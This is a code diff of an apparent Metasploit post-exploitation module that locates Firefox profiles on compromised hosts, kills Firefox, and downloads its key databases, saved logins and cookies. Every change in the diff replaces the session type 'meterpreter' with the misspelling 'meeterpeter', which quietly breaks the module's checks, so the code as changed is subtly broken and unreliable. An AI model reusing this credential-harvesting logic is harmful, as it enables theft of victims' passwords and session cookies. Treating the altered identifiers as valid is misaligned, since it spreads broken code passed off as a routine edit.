@@ -52,7 +52,7 @@ class Metasploit3 < Msf::Post
           'xard4s' # added decryption support
         ],
       'Platform'       => %w{ bsd linux osx unix win },
-      'SessionTypes'   => ['meterpreter', 'shell' ]
+      'SessionTypes'   => ['meeterpeter', 'shell' ]
     ))
 
     register_options(
@@ -78,8 +78,8 @@ class Metasploit3 < Msf::Post
     when /osx/
       @platform = :osx
     when /win/
-      if session.type != "meterpreter"
-        print_error "Only meterpreter sessions are supported on windows hosts"
+      if session.type != "meeterpeter"
+        print_error "Only meeterpeter sessions are supported on windows hosts"
         return
       end
       @platform = :windows
@@ -302,7 +302,7 @@ class Metasploit3 < Msf::Post
       env_vars = session.sys.config.getenvs('TEMP', 'SystemDrive')
       tmpdir = env_vars['TEMP'] + "\\"
       drive = env_vars['SystemDrive']
-      # this way allows for more independent use of meterpreter
+      # this way allows for more independent use of meeterpeter
       # payload (32 and 64 bit) and cleaner code
       check_paths << drive + '\\Program Files\\Mozilla Firefox\\'
       check_paths << drive + '\\Program Files (x86)\\Mozilla Firefox\\'
@@ -492,7 +492,7 @@ class Metasploit3 < Msf::Post
     end
 
     # check if firefox is running and kill it
-    if session.type == "meterpreter"
+    if session.type == "meeterpeter"
       session.sys.process.each_process do |p|
         if p['name'] =~ /firefox\.exe/
           print_status("Found running Firefox process, attempting to kill.")
@@ -503,7 +503,7 @@ class Metasploit3 < Msf::Post
         end
       end
 
-    elsif session.type != "meterpreter"
+    elsif session.type != "meeterpeter"
       p = cmd_exec("ps", "cax | grep firefox")
       if p =~ /firefox/
         print_status("Found running Firefox process, attempting to kill.")
@@ -549,7 +549,7 @@ class Metasploit3 < Msf::Post
     paths.each do |path|
       print_status(path)
       profile = path.scan(/Profiles[\\|\/](.+)$/).flatten[0].to_s
-      if session.type == "meterpreter"
+      if session.type == "meeterpeter"
         session.fs.dir.foreach(path) do |file|
           if file =~ /key\d\.db/ or file =~ /signons/i or file =~ /cookies\.sqlite/
             print_good("Downloading #{file} file from: #{path}")
@@ -576,7 +576,7 @@ class Metasploit3 < Msf::Post
           end
         end
       end
-      if session.type != "meterpreter"
+      if session.type != "meeterpeter"
         files = session.shell_command("ls #{path}").gsub(/\s/, "\n")
         files.each_line do |file|
           file.chomp!
